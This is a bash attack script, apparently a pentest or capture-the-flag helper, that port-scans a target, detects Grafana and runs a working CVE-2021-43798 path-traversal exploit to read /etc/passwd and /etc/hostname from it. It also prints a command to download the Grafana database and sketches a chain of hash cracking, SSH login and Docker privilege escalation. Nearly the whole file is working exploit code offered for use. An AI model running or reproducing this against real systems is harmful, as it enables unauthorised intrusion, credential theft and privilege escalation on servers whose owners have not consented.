#!/bin/bash
# auto-linux.sh - Auto-detect technology and exploit
# Usage: ./auto-linux.sh <target_ip>
TARGET="$1"

if [ -z "$TARGET" ]; then
    echo "Usage: auto-linux.sh <target_ip>"
    exit 1
fi

echo "=== AUTO-DETECT: $TARGET ==="

# Phase 1: Quick port scan
echo "[1] Scanning ports..."
OPEN_PORTS=$(nmap -Pn -p 22,80,443,3000,5000,8000,8080,8443,9090 --open -oG - "$TARGET" 2>/dev/null | grep '/open/' | sed 's/.* \([0-9]*\)\/open.*/\1/' | tr '\n' ' ')
echo "  Open: $OPEN_PORTS"

# Phase 2: Detect technology on each port
for port in $OPEN_PORTS; do
    echo "[2] Port $port detection..."
    HEADERS=$(curl -sI -m 5 "http://$TARGET:$port/" 2>/dev/null | tr '[:upper:]' '[:lower:]')
    BODY=$(curl -s -m 5 "http://$TARGET:$port/" 2>/dev/null | tr '[:upper:]' '[:lower:]')
    
    # Detect Grafana
    BODY=$(curl -sL -m 5 "http://$TARGET:$port/login" 2>/dev/null | tr '[:upper:]' '[:lower:]')
    if echo "$BODY" | grep -q "grafana"; then
        echo "  [+] GRAFANA detected on port $port"
        echo "  [*] Testing CVE-2021-43798 (path traversal)..."
        PASSWD=$(curl -s --path-as-is -m 5 "http://$TARGET:$port/public/plugins/grafana/../../../../../../../../etc/passwd" 2>/dev/null | head -1)
        HOSTNAME=$(curl -s --path-as-is -m 5 "http://$TARGET:$port/public/plugins/grafana/../../../../../../../../etc/hostname" 2>/dev/null)
        if echo "$PASSWD" | grep -q "root:"; then
            echo "  [+] VULNERABLE to CVE-2021-43798!"
            echo "  [*] Hostname (container ID): $HOSTNAME"
            echo "  [*] Extract DB: curl --path-as-is http://$TARGET:$port/public/plugins/grafana/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db"
        fi
    fi
    
    # Detect SSH + check version
    if [ "$port" = "22" ]; then
        SSH_VER=$(nmap -Pn -p 22 --script ssh-hostkey "$TARGET" 2>/dev/null | grep "OpenSSH" | head -1)
        echo "  [+] SSH: $SSH_VER"
    fi
done

# Phase 3: Docker detection (via SSH if we have creds)
echo "[3] Docker detection..."
echo "  [*] Use: ssh user@$TARGET 'docker ps' or check /var/run/docker.sock"

# Phase 4: Suggest exploit chain
echo ""
echo "=== EXPLOIT CHAIN SUGGESTION ==="
if echo "$OPEN_PORTS" | grep -q "3000"; then
    echo "  Grafana detected → CVE-2021-43798 → extract DB → crack hash → SSH → docker priv esc"
fi
echo ""
echo "=== Done ==="
